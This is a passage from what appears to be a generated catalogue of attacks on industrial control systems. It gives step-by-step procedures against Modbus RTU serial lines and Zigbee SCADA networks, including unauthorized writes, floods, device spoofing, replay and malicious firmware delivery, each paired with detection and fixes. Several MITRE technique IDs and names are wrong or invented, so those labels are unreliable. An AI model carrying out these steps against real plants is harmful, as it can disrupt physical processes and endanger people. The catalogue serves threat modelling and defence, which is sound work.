- **Attack Steps**: Step 1: Locate exposed RS-485 terminal on industrial machine.Step 2: Connect using USB to RS-485 adapter.Step 3: Identify slave ID and function codes using modpoll queries.Step 4: Craft unauthorized write command using modpoll to change actuator status.Step 5: Observe physical reaction (e.g., motor stops or starts).Step 6: Verify no alarms were raised on the HMI.
- **Detection**: Monitor Modbus command logs and alert on unexpected write operations
- **Solution**: Implement physical security and serial protocol authentication wrapper
- **Tags**: Modbus RTU, Serial Attack, RS-485

## Zigbee Coordinator Spoofing

- **Attack Type**: Wireless Impersonation
- **Target**: Zigbee Network
- **Vulnerability**: No Zigbee PAN security verification
- **MITRE**: T1557 - Adversary-in-the-Middle
- **Impact**: Full control over SCADA Zigbee traffic
- **Tools**: KillerBee, ZBOSS, RZUSBstick
- **Scenario**: An attacker spoofs a Zigbee coordinator device to hijack network and reroute communications.
- **Attack Steps**: Step 1: Capture beacon frames from coordinator using zbdump.Step 2: Clone beacon frame structure with spoofed PAN ID and device address.Step 3: Broadcast spoofed beacons with ZBOSS to nearby nodes.Step 4: Observe end devices automatically reconnecting to rogue coordinator.Step 5: Eavesdrop or relay commands between end devices and real coordinator.Step 6: Inject malicious control commands into the network.
- **Detection**: Compare PAN IDs and coordinator MACs against known list
- **Solution**: Use link-layer encryption, MAC address whitelisting
- **Tags**: Zigbee, Coordinator Spoofing, Zigbee Hijack

## Modbus RTU Device Flooding

- **Attack Type**: Serial Denial of Service
- **Target**: RTU, Field Device
- **Vulnerability**: Lack of rate-limiting in Modbus RTU
- **MITRE**: T0813 - DoS
- **Impact**: Disruption of industrial process
- **Tools**: Python script with pyModbus, USB RS-485 dongle
- **Scenario**: Attacker floods Modbus RTU line with requests, causing devices to lock or crash due to buffer overflow.
- **Attack Steps**: Step 1: Connect attacker laptop to Modbus RTU via RS-485 interface.Step 2: Use pyModbus to send rapid polling and write requests in a loop.Step 3: Target all known slave addresses with high-frequency queries.Step 4: Monitor slave devices for slowdowns, error lights, or failure.Step 5: Keep flooding until SCADA system displays communication timeout.Step 6: Log behavior and downtime statistics.
- **Detection**: Serial line activity anomaly detection
- **Solution**: Rate-limit Modbus traffic, implement serial firewalls
- **Tags**: DoS, Serial, Modbus RTU, pyModbus

## Zigbee Device Firmware Extraction

- **Attack Type**: Wireless Reverse Engineering
- **Target**: Zigbee Device
- **Vulnerability**: OTA update mechanism exposed
- **MITRE**: T1609 - Lateral Tool Transfer
- **Impact**: Access to firmware for offline exploitation
- **Tools**: TI SmartRF, ZBOSS Sniffer, Custom Python script
- **Scenario**: Attacker extracts firmware from Zigbee endpoint using OTA (Over-The-Air) download requests.
- **Attack Steps**: Step 1: Identify target Zigbee device that supports OTA firmware updates.Step 2: Use ZBOSS to listen for OTA upgrade announcements.Step 3: Craft spoofed OTA request and send to the device.Step 4: Capture firmware chunks as device responds with data.Step 5: Reassemble full firmware from captured chunks.Step 6: Analyze firmware with Binwalk and Ghidra for vulnerabilities.
- **Detection**: Monitor OTA requests and responses
- **Solution**: Use signed firmware and OTA authentication
- **Tags**: Zigbee, Firmware, OTA, Reverse Engineering

## Serial Sniffing Using RS-485 Tap

- **Attack Type**: Serial Eavesdropping
- **Target**: PLC or Field Controller
- **Vulnerability**: Lack of encrypted or authenticated serial traffic
- **MITRE**: T1040 - Network Sniffing
- **Impact**: Reconnaissance and future attack planning
- **Tools**: RS-485 tap clip, USB-to-RS485 adapter, Wireshark (serial plugin)
- **Scenario**: Attacker taps into a serial Modbus RTU communication line to silently observe traffic and learn device structure.
- **Attack Steps**: Step 1: Attach a passive RS-485 tap clip to the serial communication cable without disconnecting the live system. (Tool: RS-485 tap)Step 2: Connect the tap to a laptop via a USB-to-RS485 adapter. (Tool: USB-RS485)Step 3: Open Wireshark with Modbus RTU serial protocol plugin to start capturing traffic. (Tool: Wireshark)Step 4: Monitor requests and responses to identify slave IDs and commands used.Step 5: Log function codes and memory addresses (coils, registers) used.Step 6: Use captured info to plan a future injection or replay attack.
- **Detection**: Serial line monitoring with anomaly detection
- **Solution**: Use serial line encryption wrappers, physical port shielding
- **Tags**: Serial, Sniffing, Passive, Recon

## Zigbee Energy Harvesting Side Attack

- **Attack Type**: Wireless Side-Channel
- **Target**: Zigbee SCADA sensor
- **Vulnerability**: RF energy emissions
- **MITRE**: T1201 - Input Capture
- **Impact**: Timing and operation pattern leakage
- **Tools**: RF energy harvester, SDR (Software Defined Radio), GNU Radio
- **Scenario**: An attacker uses a passive energy harvesting module to listen to Zigbee signal fluctuations and infer network activity.
- **Attack Steps**: Step 1: Place energy harvester and SDR antenna near Zigbee-enabled devices. (Tool: RF harvester, SDR)Step 2: Capture ambient RF energy signals over time using GNU Radio. (Tool: GNU Radio)Step 3: Visualize energy bursts to correlate with device operation patterns.Step 4: Identify transmission bursts that align with actuator commands.Step 5: Use side-channel analysis to map timing of events and commands.Step 6: Combine with later direct sniffing to correlate energy with content.
- **Detection**: RF signal strength monitoring
- **Solution**: Reduce RF leakage, RF shielding, randomized beacon timing
- **Tags**: Zigbee, RF, Side Channel, Passive

## Rogue Zigbee End Device Injection

- **Attack Type**: Wireless Injection
- **Target**: Zigbee Coordinator
- **Vulnerability**: No device whitelisting or auth
- **MITRE**: T1586 - Compromise Infrastructure
- **Impact**: SCADA trust failure via fake sensor data
- **Tools**: CC2531 USB dongle, KillerBee, zbassocflood.py, ZBOSS stack
- **Scenario**: Attacker introduces a fake Zigbee end-device to communicate with SCADA coordinator and send bogus sensor data.
- **Attack Steps**: Step 1: Plug in Zigbee-compatible CC2531 dongle into laptop. (Tool: CC2531)Step 2: Use KillerBee’s zbid to detect existing Zigbee networks.Step 3: Identify PAN ID and network key (if not encrypted). (Tool: KillerBee)Step 4: Use zbassocflood.py or ZBOSS to associate rogue device to the network. (Tool: zbassocflood.py)Step 5: Begin sending sensor packets mimicking existing devices with modified readings.Step 6: Monitor HMI/SCADA dashboard for changes based on fake data.
- **Detection**: Device join event monitoring
- **Solution**: MAC-based filtering, device fingerprinting, encrypted joins
- **Tags**: Zigbee, Sensor Injection, Fake Device

## RS-232 to USB Device Spoofing

- **Attack Type**: Serial Device Emulation
- **Target**: SCADA system
- **Vulnerability**: No device verification over serial
- **MITRE**: T1557 - Man-in-the-Middle
- **Impact**: Fake data accepted as real
- **Tools**: USB to RS-232 cable, socat, modbus-tk Python library
- **Scenario**: Attacker creates a spoofed serial Modbus device using USB adapter to emulate real field equipment.
- **Attack Steps**: Step 1: Set up a laptop with USB to RS-232 adapter to mimic a field device. (Tool: USB-RS232)Step 2: Use socat to create virtual serial ports. (Tool: socat)Step 3: Use modbus-tk Python script to create a fake Modbus slave responding to specific queries. (Tool: modbus-tk)Step 4: Connect to the SCADA RTU expecting that device’s response.Step 5: Respond with altered or malicious data, e.g., fake temperature value.Step 6: Observe SCADA's reaction to rogue readings.
- **Detection**: Serial device enumeration and ID matching
- **Solution**: Use cryptographic authentication, device trust registry
- **Tags**: Serial, Spoofing, RS-232, Emulation

## Zigbee Beacon Flood Denial

- **Attack Type**: Wireless DoS
- **Target**: Zigbee Gateway
- **Vulnerability**: Overloaded beacon channel
- **MITRE**: T0813 - DoS
- **Impact**: Prevents device connections
- **Tools**: Scapy-radio, RZUSBstick, zbassocflood.py
- **Scenario**: Attacker floods Zigbee network with fake beacon frames, confusing or disabling device joins.
- **Attack Steps**: Step 1: Use Scapy-radio to create many fake Zigbee PANs with random MACs. (Tool: Scapy-radio)Step 2: Transmit thousands of beacon frames per second using RZUSBstick. (Tool: RZUSBstick)Step 3: Monitor real Zigbee network's join process to observe failures.Step 4: Attempt to associate real devices and observe inability to join.Step 5: Confirm temporary network outage or high delay in device reconnects.Step 6: Log device response and HMI alerts.
- **Detection**: Monitor beacon volume and RF collision rate
- **Solution**: Beacon rate limiting, RF jamming detection
- **Tags**: Zigbee, Beacon, Denial of Service

## Serial Protocol Replay via Line Logger

- **Attack Type**: Serial Replay
- **Target**: Modbus RTU slave
- **Vulnerability**: Stateless communication, no timestamps
- **MITRE**: T1001.003 - Protocol Manipulation
- **Impact**: Unauthorized command execution
- **Tools**: Serial line logger, pyserial, replay.py
- **Scenario**: An attacker captures valid Modbus RTU traffic and replays it to re-trigger operations like opening a valve.
- **Attack Steps**: Step 1: Use serial logger hardware to record live communication between SCADA and field devices. (Tool: Serial Logger)Step 2: Store logged traffic in hex/binary format.Step 3: Use pyserial and a replay script to send captured frames back into the serial line. (Tool: pyserial)Step 4: Wait for safe interval, then inject replay data.Step 5: Observe device repeat previous action (e.g., valve opens again).Step 6: Verify replay was accepted silently by SCADA.
- **Detection**: Traffic fingerprinting and timing analysis
- **Solution**: Add timestamps, session tokens to Modbus
- **Tags**: Serial, Replay, RTU, pyserial

## Zigbee Over-the-Air Exploit Delivery

- **Attack Type**: Wireless Malware Delivery
- **Target**: Zigbee Sensor
- **Vulnerability**: OTA updates without signature validation
- **MITRE**: T1608 - Stage Capabilities
- **Impact**: Persistent compromise
- **Tools**: ZBOSS stack, OTAImage tool, Binwalk, Wireshark
- **Scenario**: Attacker uses Zigbee OTA update mechanism to deliver malicious firmware to end devices.
- **Attack Steps**: Step 1: Capture OTA update requests using Zigbee sniffer. (Tool: ZBOSS, Wireshark)Step 2: Extract and analyze original firmware with Binwalk. (Tool: Binwalk)Step 3: Modify firmware to include backdoor (e.g., hardcoded data sender).Step 4: Repackage firmware using OTAImage tool. (Tool: OTAImage Tool)Step 5: Use ZBOSS to impersonate update server and send firmware.Step 6: Device accepts and installs malicious update.
- **Detection**: Monitor and whitelist firmware hashes
- **Solution**: Enforce signed updates, secure boot
- **Tags**: Zigbee, OTA, Malware

## Modbus Broadcast Flood

- **Attack Type**: Serial Denial of Service
- **Target**: RTU network
- **Vulnerability**: Modbus broadcast abuse
- **MITRE**: T0813 - DoS
- **Impact**: Full device communication halt
- **Tools**: pyModbus, RS-485 cable, Python script
- **Scenario**: Attacker sends continuous Modbus broadcast messages, overwhelming all slaves.
- **Attack Steps**: Step 1: Connect attacker laptop to RS-485 line. (Tool: RS-485 cable)Step 2: Write Python script using pyModbus to send broadcast command (ID 0). (Tool: pyModbus)Step 3: Loop broadcast every 0.1 seconds with function code 16 (write multiple registers).Step 4: Observe all devices responding simultaneously, leading to bus collisions.Step 5: Eventually devices may enter fault state or SCADA reports timeout.Step 6: Log bus errors.
- **Detection**: Serial bus error monitoring
- **Solution**: Ignore broadcast ID, firmware updates to reject ID 0
- **Tags**: Modbus, Broadcast, DoS

## Zigbee PAN ID Conflict Attack

- **Attack Type**: Wireless Disruption
- **Target**: Zigbee Network
- **Vulnerability**: No unique identity check
- **MITRE**: T1557.002 - Rogue Device
- **Impact**: SCADA node redirection
- **Tools**: ZBOSS, Scapy-radio, RZUSBstick
- **Scenario**: Attacker clones legitimate PAN ID with higher signal strength to hijack device association.
- **Attack Steps**: Step 1: Scan Zigbee beacons to find real PAN ID. (Tool: Scapy-radio)Step 2: Use ZBOSS to configure rogue coordinator with same PAN ID but stronger RF.Step 3: Begin broadcasting fake beacons to attract nearby Zigbee nodes.Step 4: Observe devices disassociating from real PAN and joining rogue one.Step 5: Record or alter traffic from newly joined devices.Step 6: Interfere with legitimate coordinator operation.
- **Detection**: PAN ID consistency check
- **Solution**: PAN authentication, signed beacon frames
- **Tags**: Zigbee, PAN, Rogue Device

## Modbus RTU Serial Device Enumeration

- **Attack Type**: Serial Reconnaissance
- **Target**: Modbus Field Devices
- **Vulnerability**: No address obfuscation
- **MITRE**: T1592.004 - Device Identification
- **Impact**: Recon and fingerprinting
- **Tools**: modpoll, USB to RS485, Modscan32
- **Scenario**: Attacker queries all Modbus IDs to find valid slaves and function codes.
- **Attack Steps**: Step 1: Connect to serial line using USB-RS485. (Tool: USB-RS485)Step 2: Use modpoll to send queries to IDs 1-247. (Tool: modpoll)Step 3: Log responses to identify live devices.Step 4: Attempt various function codes (1, 2, 3, 4, 5, 6, 16).Step 5: Note down supported addresses and register sizes.Step 6: Export inventory for planning targeted attacks.
- **Detection**: Device response count tracking
- **Solution**: Limit Modbus scan rate, require whitelist-based queries
- **Tags**: Modbus, Scan, Enumeration

## Zigbee Endpoint Overload

- **Attack Type**: Wireless Resource Exhaustion
- **Target**: Zigbee Sensor
- **Vulnerability**: No rate-limiting, weak battery/device protection
- **MITRE**: T1499.001 - Resource Exhaustion
- **Impact**: Loss of device availability
- **Tools**: KillerBee, CC2531 USB, zb_send.py
- **Scenario**: Attacker targets a Zigbee end-device (sensor or actuator) with rapid messages, draining battery and memory.
- **Attack Steps**: Step 1: Connect CC2531 USB dongle and run KillerBee. (Tool: CC2531, KillerBee)Step 2: Use zbdump to capture device PAN ID and short address.Step 3: Use zb_send.py to rapidly send repeated legitimate request messages to the target device.Step 4: Continue message spam at a fixed frequency (e.g., 10/sec).Step 5: Monitor the endpoint for increased latency, battery drain, or system unresponsiveness.Step 6: Verify that device stops responding or crashes due to overload.
- **Detection**: Device health monitoring, response timeout alerts
- **Solution**: Add message throttling, watchdogs, battery-aware logic
- **Tags**: Zigbee, Resource Exhaustion

## Modbus Serial Cable Swap Attack

- **Attack Type**: Physical/Serial Hijack
- **Target**: Field Device (PLC, sensor)
- **Vulnerability**: No physical port protection
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Fake values accepted without verification
- **Tools**: RS-485 connector, Raspberry Pi, pymodbus
- **Scenario**: Attacker physically unplugs a legitimate RS-485 device and replaces it with a malicious Modbus slave.
- **Attack Steps**: Step 1: Disconnect the original Modbus slave device from RS-485 network. (Tool: RS-485 Cable)Step 2: Connect Raspberry Pi with USB-RS485 interface in its place. (Tool: Raspberry Pi, USB-RS485)Step 3: Run a pymodbus server emulating the original device’s address and data structure. (Tool: pymodbus)Step 4: Respond to SCADA master with altered readings (e.g., fake high pressure).Step 5: Observe SCADA HMI accepting the new values without raising alerts.Step 6: Use these altered values to mislead operators.
- **Detection**: Field device check-in logs, physical port alarms
- **Solution**: Lock RS-485 ports, bind IDs with secure fingerprints
- **Tags**: Serial, Physical Swap, Impersonation

## Zigbee Channel Hopping Disruption

- **Attack Type**: Wireless Interference
- **Target**: Zigbee Network
- **Vulnerability**: No jamming defense or retries
- **MITRE**: T0813 - DoS
- **Impact**: Disrupts real-time communication
- **Tools**: SDR (HackRF), GNU Radio, Zigbee jamming script
- **Scenario**: Attacker rapidly switches channels while injecting malformed Zigbee packets to disrupt multi-channel setups.
- **Attack Steps**: Step 1: Use SDR and GNU Radio to monitor Zigbee traffic patterns. (Tool: HackRF, GNU Radio)Step 2: Identify active channels in use by Zigbee devices.Step 3: Run a channel-hopping script that sends malformed or empty Zigbee frames across all active channels. (Tool: custom jamming script)Step 4: Continue broadcasting bursts in rotating intervals.Step 5: Confirm device disconnects or failures in data transmission.Step 6: Observe failure logs in SCADA interface or field gateway.
- **Detection**: RF spectrum monitoring tools
- **Solution**: Zigbee channel hopping with error correction
- **Tags**: Zigbee, Channel Jamming

## Modbus RTU Function Code Abuse

- **Attack Type**: Serial Protocol Misuse
- **Target**: Modbus RTU Slave
- **Vulnerability**: Support for undocumented or unsafe function codes
- **MITRE**: T0838 - Exploit Public-Facing Application
- **Impact**: Potential device instability or logic reset
- **Tools**: modpoll, USB RS-485 adapter
- **Scenario**: Attacker sends rarely used function codes (e.g., diagnostic codes) to confuse or crash Modbus RTU slaves.
- **Attack Steps**: Step 1: Connect to Modbus serial line via USB-RS485 adapter. (Tool: USB-RS485)Step 2: Use modpoll to send function code 08 (diagnostic) repeatedly. (Tool: modpoll)Step 3: Try different sub-functions like 'Restart Communications Option' or 'Return Diagnostic Register'.Step 4: Observe unexpected behavior such as crash, reset, or faulty response.Step 5: Note absence of any SCADA alert in some cases.Step 6: Repeat with other diagnostic codes to fingerprint vulnerabilities.
- **Detection**: Analyze function code usage logs
- **Solution**: Block rarely used function codes, whitelist-only policy
- **Tags**: Modbus RTU, Diagnostic, Code Abuse

## Zigbee Association Table Flood

- **Attack Type**: Wireless Memory Exploit
- **Target**: Zigbee Coordinator
- **Vulnerability**: No limit or expiration on association table entries
- **MITRE**: T1499.003 - Application Exhaustion
- **Impact**: Blocks new sensor connections
- **Tools**: KillerBee, zbassocflood.py
- **Scenario**: Attacker floods the Zigbee coordinator with fake device association requests, filling its memory.
- **Attack Steps**: Step 1: Launch zbassocflood.py tool with a spoofed MAC address range. (Tool: zbassocflood.py)Step 2: Send hundreds of association requests to the Zigbee coordinator.Step 3: Observe memory allocation on coordinator increase rapidly.Step 4: Once table is full, valid devices cannot join the network.Step 5: SCADA may report device offline or fail silently.Step 6: Log memory usage and device join failures.
- **Detection**: Monitor memory and join queue
- **Solution**: Time-bound join attempts, memory cleanup routines
- **Tags**: Zigbee, Join Flood, Memory DoS

## RS-485 Echo Suppression Attack

- **Attack Type**: Serial Line Manipulation
- **Target**: Modbus RTU Line
- **Vulnerability**: Timing critical protocol
- **MITRE**: T0813 - DoS
- **Impact**: Corrupted or incomplete communications
- **Tools**: Signal delay module, oscilloscope
- **Scenario**: Attacker modifies signal reflection timing to disrupt communication between master and slave.
- **Attack Steps**: Step 1: Tap into RS-485 line with delay injector circuit. (Tool: Delay module)Step 2: Introduce microsecond-level delays on specific lines.Step 3: Monitor response with oscilloscope to fine-tune delay that causes checksum errors. (Tool: Oscilloscope)Step 4: Induce timing mismatches between transmitted and received bytes.Step 5: Observe SCADA timing out due to corrupted replies.Step 6: Log error rates and delay thresholds.
- **Detection**: Line integrity test tools
- **Solution**: Use robust shielding and timing compensation
- **Tags**: RS-485, Timing, Delay

## Zigbee Fake Sensor Calibration Attack

- **Attack Type**: Wireless Logic Injection
- **Target**: Zigbee Sensor
- **Vulnerability**: Unverified calibration commands
- **MITRE**: T1565.002 - Stored Data Manipulation
- **Impact**: Long-term SCADA error accumulation
- **Tools**: CC2531, Zigpy, Custom firmware
- **Scenario**: Attacker tricks Zigbee device into applying false calibration values, skewing real readings.
- **Attack Steps**: Step 1: Capture OTA calibration messages from SCADA. (Tool: CC2531, Zigpy)Step 2: Create spoofed calibration packet with new offset/gain.Step 3: Inject this packet into the network during known calibration cycle.Step 4: Device accepts false values and adjusts its internal logic.Step 5: Future sensor data is consistently incorrect.Step 6: Monitor for misaligned readings across time.
- **Detection**: Cross-check readings with secondary sensors
- **Solution**: Digitally sign calibration packets
- **Tags**: Zigbee, Calibration, Logic Attack

## Modbus RTU Data Type Overflow

- **Attack Type**: Serial Data Corruption
- **Target**: RTU/PLC
- **Vulnerability**: Lack of size validation in RTU firmware
- **MITRE**: T1203 - Exploitation for Privilege Escalation
- **Impact**: Memory corruption and service crash
- **Tools**: modbus-tk, Python, USB-RS485
- **Scenario**: Attacker writes beyond allowed data size in a register, causing buffer overflow.
- **Attack Steps**: Step 1: Connect laptop to serial Modbus line. (Tool: USB-RS485)Step 2: Use modbus-tk to craft a Write Multiple Registers command. (Tool: modbus-tk)Step 3: Set payload larger than expected (e.g., 1000 bytes into a 100-byte register).Step 4: Inject command and monitor for device crash or unexpected logic.Step 5: Observe if device resets, ignores future requests, or corrupts memory.Step 6: Document effects and SCADA reaction.
- **Detection**: Track register size anomalies
- **Solution**: Apply firmware input validation patches
- **Tags**: Modbus, Overflow, Serial Exploit

## Zigbee Clock Drift Desync

- **Attack Type**: Wireless Desynchronization
- **Target**: Zigbee Endpoint
- **Vulnerability**: No clock resync integrity checks
- **MITRE**: T1499.004 - Clock Skew
- **Impact**: Loss of sync and device isolation
- **Tools**: ZBOSS sniffer, RF transmitter
- **Scenario**: Attacker slowly shifts timing of Zigbee frames to desync clock of the end-device.
- **Attack Steps**: Step 1: Analyze timing of beacon frames from coordinator. (Tool: ZBOSS)Step 2: Mimic valid beacon with slight timing delay (microseconds). (Tool: RF Transmitter)Step 3: Continue injecting these beacons periodically.Step 4: Device slowly adopts skewed timing.Step 5: Over time, this causes missed data sync and failed messages.Step 6: Device eventually disconnects from network due to clock mismatch.
- **Detection**: Clock skew monitoring and beacon timestamping
- **Solution**: Timestamp validation, secure resync
- **Tags**: Zigbee, Clock Drift, Timing

## Modbus Serial Bridging via Radio

- **Attack Type**: Serial-to-Wireless Relay
- **Target**: RTU or Slave Device
- **Vulnerability**: Serial interface exposed to wireless relay
- **MITRE**: T1572 - Protocol Tunneling
- **Impact**: Allows out-of-band, stealthy command injection
- **Tools**: RF modem (e.g., XBee), Modbus Gateway
- **Scenario**: Attacker bridges serial Modbus RTU over wireless to remote site for off-site attack replay.
- **Attack Steps**: Step 1: Connect RF modem to RS-485 terminal using Modbus Gateway. (Tool: RF Modem, Gateway)Step 2: Redirect all Modbus traffic to attacker-controlled remote receiver.Step 3: Use remote script to log, alter, or replay traffic from another location.Step 4: Forward malicious responses back through the bridge.Step 5: SCADA continues interacting with “normal” Modbus slave unaware of the remote relay.Step 6: Log delay and integrity differences.
- **Detection**: Monitor communication latency and packet route
- **Solution**: Isolate Modbus to wired-only secure zones
- **Tags**: Serial Relay, Wireless Tunnel

## Zigbee Routing Table Poisoning

- **Attack Type**: Wireless Routing Manipulation
- **Target**: Zigbee Mesh Network
- **Vulnerability**: Insecure route advertisement acceptance
- **MITRE**: T1020 - Traffic Capture
- **Impact**: Adversary-in-the-middle access
- **Tools**: ZBOSS, CC2531, Zigbee mesh analyzer
- **Scenario**: Attacker injects fake routing entries into Zigbee mesh to divert traffic through rogue node.
- **Attack Steps**: Step 1: Use CC2531 dongle with ZBOSS to join the Zigbee mesh. (Tool: CC2531, ZBOSS)Step 2: Identify routing table entries using Zigbee mesh analyzer.Step 3: Craft malicious route requests (RREQ) advertising false paths.Step 4: Devices start routing traffic through attacker's node.Step 5: Capture and optionally alter traffic passing through rogue path.Step 6: Monitor SCADA communication latency or errors.
- **Detection**: Analyze routing table changes
- **Solution**: Validate route origin and trust score
- **Tags**: Zigbee, Routing Poisoning

## Serial Loopback Exploit

- **Attack Type**: Hardware Exploitation
- **Target**: Serial RTU Device
- **Vulnerability**: No verification of message origin
- **MITRE**: T1557 - Adversary-in-the-Middle
- **Impact**: Induced logic faults or restarts
- **Tools**: RS-485 loopback plug, oscilloscope
- **Scenario**: Attacker tricks a device into self-communication by manipulating RS-485 wiring.
- **Attack Steps**: Step 1: Disconnect normal RS-485 line and insert loopback wiring (Tx/Rx connected). (Tool: Loopback Plug)Step 2: Power on the device and observe self-communication.Step 3: Some devices interpret looped responses as valid external data.Step 4: Monitor for abnormal device behavior (e.g., status toggles, reset).Step 5: Use oscilloscope to verify signal duplication. (Tool: Oscilloscope)Step 6: Document misbehavior or logic corruption.
- **Detection**: Monitor checksum vs origin address
- **Solution**: Detect loopback voltage signatures
- **Tags**: RS-485, Loopback, Hardware

## Zigbee Trust Center Spoofing

- **Attack Type**: Wireless Trust Abuse
- **Target**: Zigbee Network
- **Vulnerability**: No encryption or authentication in Trust Center join
- **MITRE**: T1556.003 - Network Protocol Impersonation
- **Impact**: Fake device legitimacy
- **Tools**: KillerBee, custom Python script
- **Scenario**: Attacker impersonates Zigbee Trust Center to approve rogue device joins.
- **Attack Steps**: Step 1: Capture Trust Center join responses using KillerBee. (Tool: KillerBee)Step 2: Clone packet format and broadcast fake join responses.Step 3: Rogue devices now believe they are securely joined.Step 4: Rogue devices start injecting or intercepting messages.Step 5: Monitor HMI for abnormal data values or timestamps.Step 6: Trust Center remains unaware unless packet integrity is verified.
- **Detection**: Detect duplicate MAC join requests
- **Solution**: Enforce signed network key exchange
- **Tags**: Zigbee, Trust Center, Join Attack

## Serial Modbus ACK Flood

- **Attack Type**: Serial ACK Exploit
- **Target**: SCADA to Modbus RTU
- **Vulnerability**: No message signature or timestamp
- **MITRE**: T1557 - Response Spoofing
- **Impact**: Incorrect operation status in SCADA
- **Tools**: pyModbus, RS-485 injector
- **Scenario**: Attacker repeatedly sends positive Modbus acknowledgments to confuse SCADA into assuming successful writes.
- **Attack Steps**: Step 1: Inject RS-485 splitter into Modbus line. (Tool: RS-485 splitter)Step 2: Use pyModbus to flood ACK replies to write requests before actual response. (Tool: pyModbus)Step 3: Observe SCADA accepting false ACK and skipping real device response.Step 4: Trigger inconsistent values on SCADA dashboard.Step 5: Log response collision timings.Step 6: Use timing anomalies to differentiate real vs fake responses.
- **Detection**: Response fingerprinting tools
- **Solution**: Include session IDs in request/response pairs
- **Tags**: Modbus, ACK, Spoof

## Zigbee Endpoint Sleep Attack

- **Attack Type**: Wireless Power Exploit
- **Target**: Battery-Powered Zigbee Sensor
- **Vulnerability**: No anti-wakeup threshold or validation
- **MITRE**: T1499.001 - Resource Exhaustion
- **Impact**: Premature battery failure
- **Tools**: zb_send.py, CC2531
- **Scenario**: Attacker keeps waking low-power Zigbee sensors, draining battery rapidly.
- **Attack Steps**: Step 1: Identify end devices with sleep cycles via beacon capture. (Tool: KillerBee, zb_send.py)Step 2: Inject crafted data frames shortly after sleep cycle begins.Step 3: Repeated frames prevent device from entering low-power state.Step 4: Over several hours, battery drains faster than expected.Step 5: Monitor sensor failure or dropout from network.Step 6: SCADA logs missing sensor updates.
- **Detection**: Monitor power consumption patterns
- **Solution**: Include logic to throttle wakeups
- **Tags**: Zigbee, Sleep Attack, Battery

## Serial Cross-Wire Induced Failure

- **Attack Type**: Wiring-Level Fault Injection
- **Target**: Modbus Slave
- **Vulnerability**: No protection against wiring faults
- **MITRE**: T0813 - DoS
- **Impact**: Data corruption or non-communication
- **Tools**: RS-485 cable, tester, logic analyzer
- **Scenario**: Physical attacker switches signal lines causing reversed polarity and logic faults.
- **Attack Steps**: Step 1: Reverse wiring of A/B differential pair on RS-485 interface. (Tool: RS-485 cable)Step 2: Power device and observe startup behavior.Step 3: Many devices enter fault mode or generate inverted responses.Step 4: Use logic analyzer to record waveform distortion. (Tool: Logic Analyzer)Step 5: Confirm SCADA receives incorrect or checksum-failed messages.Step 6: Track fault occurrence across field devices.
- **Detection**: Monitor for zero or high CRC failure rates
- **Solution**: Add polarity detection and fault protection circuitry
- **Tags**: Modbus RTU, Cross-Wire

## Zigbee Firmware Downgrade Attack

- **Attack Type**: Wireless Downgrade
- **Target**: Zigbee Sensor/Actuator
- **Vulnerability**: No downgrade prevention or version check
- **MITRE**: T1609.002 - Downgrade Attack
- **Impact**: Enables use of known vulnerabilities
- **Tools**: OTAImageTool, ZBOSS, Binwalk
- **Scenario**: Attacker forces device to install older, vulnerable firmware version over Zigbee OTA.
- **Attack Steps**: Step 1: Extract older firmware image using OTAImageTool. (Tool: OTAImageTool)Step 2: Use ZBOSS to send OTA firmware downgrade command to target device. (Tool: ZBOSS)Step 3: Device downloads and applies unsigned older image.Step 4: Older firmware lacks recent security patches.Step 5: Exploit known bug using payload over Zigbee.Step 6: Establish permanent backdoor access.
- **Detection**: Monitor firmware hashes and versions
- **Solution**: Enforce signed firmware and version control
- **Tags**: Zigbee, Firmware Downgrade

## Serial Noise Injection

- **Attack Type**: Analog Noise Exploit
- **Target**: RS-485 Communication
- **Vulnerability**: No shielding or noise rejection
- **MITRE**: T0813 - DoS
- **Impact**: Random errors, potential control loss
- **Tools**: Signal generator, RS-485 coupling circuit
- **Scenario**: Attacker injects high-frequency noise into serial line to induce data corruption.
- **Attack Steps**: Step 1: Build coupling circuit to inject RF noise onto RS-485 line. (Tool: Signal Generator, Coupler)Step 2: Use signal generator to inject high-frequency square waves.Step 3: Target idle periods between data frames.Step 4: Observe CRC mismatch errors in SCADA logs.Step 5: Device may crash or misinterpret command.Step 6: Document frequency/power that causes failure.
- **Detection**: CRC error trend monitoring
- **Solution**: Shielded cabling, opto-isolation
- **Tags**: Serial Noise, RF Fault

## Zigbee Identity Theft via Clone MAC

- **Attack Type**: Wireless Identity Spoofing
- **Target**: Zigbee End Device
- **Vulnerability**: No MAC validation/authentication
- **MITRE**: T1585.003 - Device Impersonation
- **Impact**: Malicious device accepted as real
- **Tools**: CC2531, MAC scanner, KillerBee
- **Scenario**: Attacker uses stolen MAC address to replace real Zigbee device.
- **Attack Steps**: Step 1: Use KillerBee to capture traffic and identify device MAC. (Tool: KillerBee)Step 2: Configure rogue device with same MAC.Step 3: Shut down real device by RF interference or sleep state.Step 4: Attacker now receives commands meant for real device.Step 5: Inject malicious responses (e.g., fake temperature).Step 6: Monitor HMI for spoofed values.
- **Detection**: Watch for duplicate MACs on join
- **Solution**: Use secure device ID & certificate pairing
- **Tags**: Zigbee, MAC Spoofing

## Serial RTU Flood via Multiple Masters

- **Attack Type**: Protocol Abuse
- **Target**: Modbus Slave Devices
- **Vulnerability**: No master arbitration logic
- **MITRE**: T0813 - DoS
- **Impact**: Protocol confusion, real master outage
- **Tools**: modpoll (Master), USB-RS485 Hub
- **Scenario**: Attacker introduces secondary Modbus master, sending out-of-sync requests, creating traffic congestion.
- **Attack Steps**: Step 1: Connect rogue laptop to Modbus line with USB-RS485. (Tool: USB-RS485 Hub)Step 2: Run modpoll on attacker side as rogue master.Step 3: Send high-frequency polling requests to all devices.Step 4: Devices become overloaded with conflicting masters.Step 5: Real master receives NAKs or CRC errors.Step 6: Monitor SCADA logs for timeouts and device errors.
- **Detection**: Scan for unexpected master requests
- **Solution**: Isolate master IDs, enforce single controller
- **Tags**: Modbus, Rogue Master

## Zigbee Encrypted Packet Delay Replay

- **Attack Type**: Wireless Replay
- **Target**: Zigbee Actuator
- **Vulnerability**: No anti-replay protection despite encryption
- **MITRE**: T1001.003 - Protocol Manipulation
- **Impact**: Duplicate actuator execution
- **Tools**: CC2531, KillerBee, zbreplay.py
- **Scenario**: Attacker captures encrypted Zigbee packets and replays them with intentional delays to trigger repeated actuator actions.
